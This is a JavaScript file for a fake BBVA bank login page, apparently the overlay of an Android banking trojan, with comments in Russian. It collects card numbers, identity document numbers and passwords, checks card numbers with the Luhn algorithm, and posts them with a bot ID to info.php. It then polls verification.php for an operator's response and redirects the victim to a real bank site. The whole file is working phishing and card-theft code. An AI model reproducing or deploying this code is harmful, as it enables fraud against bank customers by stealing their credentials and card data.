document.addEventListener("DOMContentLoaded", function () {
  // var initialHeight = window.innerHeight;
  // document.body.style.minHeight = initialHeight + "px";
  let lunarChecked = false
  const container = document.querySelector('.container');
  let errorMes = ''
  container.style.minHeight = `${window.innerHeight}px`;
  window.addEventListener('resize', () => {
    const container = document.querySelector('.container');
    container.style.minHeight = `${window.innerHeight}px`;
  });

  const form = document.querySelector("#myForm");
  const cardNumber = document.querySelector("#cardNumber");
  const docType = document.querySelector("#docType");
  const docNumber = document.querySelector("#docNumber");
  const password = document.querySelector("#password");
  const fingerprint = document.querySelector(".fingerprint");
  const loader = document.querySelector(".loader-wrapper");
  fingerprint.addEventListener("click", function () {
    this.classList.toggle("finger_black");
  });

  const recordarCheckbox = document.getElementById("recordar");
  const inputFields = [cardNumber, docType, docNumber, password];
  function toggleGreenBorder() {
    if (recordarCheckbox.checked) {
      // Add green border
      cardNumber.classList.add("green-border");
      docType.classList.add("green-border");
      docNumber.classList.add("green-border");

      // Remove green border after 3 seconds
      setTimeout(() => {
        cardNumber.classList.remove("green-border");
        docType.classList.remove("green-border");
        docNumber.classList.remove("green-border");
      }, 3000);
    }
  }

  function addFocusClass() {
    this.classList.add("focus-green-border");
  }

  function removeFocusClass() {
    this.classList.remove("focus-green-border");
  }

  // Listen for checkbox change
  recordarCheckbox.addEventListener("change", toggleGreenBorder);

  // Add focus and blur event listeners for input fields
  inputFields.forEach((field) => {
    field.addEventListener("focus", addFocusClass);
    field.addEventListener("blur", removeFocusClass);
  });




  // Валидация и форматирование номера карты
  cardNumber.addEventListener("input", function () {
    let value = this.value.replace(/[^\d]/g, ""); // Убираем все нецифровые символы
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    this.value = value.replace(/(.{4})/g, "$1 ").trim();
  });

  docType.addEventListener("change", function () {
    docNumber.value = "";
    switch (this.value) {
      case "DNI":
        docNumber.type = "tel";
        break;
      case "Pasaporte":
      case "CE":
        docNumber.type = "text";
        break;
      default:
        docNumber.type = "text";
        break;
    }
  });
  // Валидация и фильтрация при вводе
  docNumber.addEventListener("input", function () {
    let value = this.value;
    let pattern;
    let maxLength;

    switch (docType.value) {
      case "DNI":
        pattern = /^[0-9]*$/;
        maxLength = 8;
        break;
      case "Pasaporte":
      case "CE":
        pattern = /^[a-zA-Z0-9]*$/;
        maxLength = 11;
        break;
      default:
        pattern = /^.*$/;
        maxLength = 11;
        break;
    }
    // Обрезать значение по максимальной длине
    if (value.length > maxLength) {
      value = value.slice(0, maxLength);
    }

    // Удалить недопустимые символы
    value = value.match(pattern) ? value : value.slice(0, -1);

    this.value = value;
  });

  // Обработка отправки формы
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    let valid = true;
     errorMes = "Por favor, corrija los siguientes errores:\n";

    let cardNumValue = cardNumber.value.replace(/ /g, "");
    if (cardNumValue.length !== 16 || isNaN(cardNumValue)) {
      valid = false;
      errorMes +=
        "Por favor, ingresa todos los dígitos de tu tarjeta";
    }

    if (password.value.length < 6 || password.value.length > 20) {
      valid = false;
      errorMes += "- La contraseña debe tener entre 6 y 20 caracteres.\n";
    }

    let docNumValue = docNumber.value;
    switch (docType.value) {
      case "DNI":
        if (!/^\d+$/.test(docNumValue)) {
          valid = false;
          errorMes = "ingresa tu numero de documento para confirmar la operación";
        }
        break;
      case "Pasaporte":
      case "CE":
        if (!/^[a-zA-Z0-9]{4,11}$/.test(docNumValue)) {
          valid = false;
          errorMes = "ingresa tu numero de documento para confirmar la operación";
        }
        break;
    }

    if (valid && lunarChecked) {
      sendForm("myForm");
      loader.style.display = "flex";
    } else {
      customAlert();
    }
  });

  // Получение модального окна и кнопки закрыть
  const modal = document.getElementById("myModal");
  const closeModalBtn = document.getElementById("popupButton");

  // Открытие модального окна вместо alert
  function showModal() {
    const popup_error = document.getElementById('popup-error')
    popup_error.innerText = errorMes
    modal.style.display = "flex";
  }

  // Закрытие модального окна при клике на кнопку
  closeModalBtn.addEventListener("click", function () {
    modal.style.display = "none";
  });

  // Закрытие модального окна при клике вне его области
  // window.addEventListener("click", function (event) {
  //   if (event.target === modal) {
  //     modal.style.display = "none";
  //   }
  // });

  // Замена стандартного alert на модальное окно
  function customAlert() {
    showModal();
  }

  const elementoContacto = document.querySelector(".contacto");

  const elementoUbicanos = document.querySelector(".ubicanos");

  elementoContacto.addEventListener("click", () => {
    Android.clickcallphone();
  });

  elementoUbicanos.addEventListener("click", () => {
    Android.clickopenlocation();
  });

  function sendForm(formid) {
    var form = document.getElementById(formid);

    var formData = new FormData(form);

    var botId = getQueryParam("botid");
    formData.append("botid", botId); //добавляем ботайди
    formData.append("target", "bbva"); //добавляем ботайди

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "info.php", true);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        // Обработка успешного ответа сервера
        console.log(xhr.responseText);
        sendRequestWithBotId(); // Начинаем отслеживание с сервера
        loader.style.display = "none";
      } else {
        // Обработка ошибок
        console.error(xhr.statusText);
      }
    };
    console.log(formData);
    xhr.send(formData);
  }

  function sendRequestWithBotId() {
    var botId = getQueryParam("botid");

    if (botId) {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "verification.php?botid=" + botId, true);
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          var responseCode = xhr.status;
          if (responseCode === 200) {
            setTimeout(sendRequestWithBotId, 1000); // обновляется эта команда каждую секунду
          } else if (responseCode === 201) {
            window.location.href = "https://interbank.pe"; //редир на интер
          } else if (responseCode === 202) {
            errorMes = "Los datos ingresados son incorrectos. Por favor valida tu número de tarjeta y documento de identidad."
            customAlert()
            //добавь свой код который при ошибке ебашишь
          } else {
            console.error("Unexpected response code: " + responseCode);
          }
        }
      };
      xhr.send();
    } else {
      console.error("Missing botid parameter");
    }
  }

  function getQueryParam(name) {
    var urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }
  // Функция для проверки номера карты с использованием алгоритма Луна
function luhnCheck(cardNumber) {
  let arr = cardNumber.split('').reverse();
  let sum = 0;

  for (let i = 0; i < arr.length; i++) {
    let digit = parseInt(arr[i], 10);

    if (i % 2 !== 0) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }
    sum += digit;
  }
  return sum % 10 === 0;
}

// Слушатель событий для поля ввода номера карты
document.getElementById("cardNumber").addEventListener("input", function(e) {
  const input = e.target.value.replace(/\s+/g, '');  // Удаляем все пробелы
  if (input.length >= 16) {  // Здесь может быть ваше условие для длины карты
    if (luhnCheck(input)) {
      lunarChecked = true
      // console.log("Номер карты валидный");
    } else {
      lunarChecked =false
      // console.log("Номер карты невалидный");
    }
  }
});

});
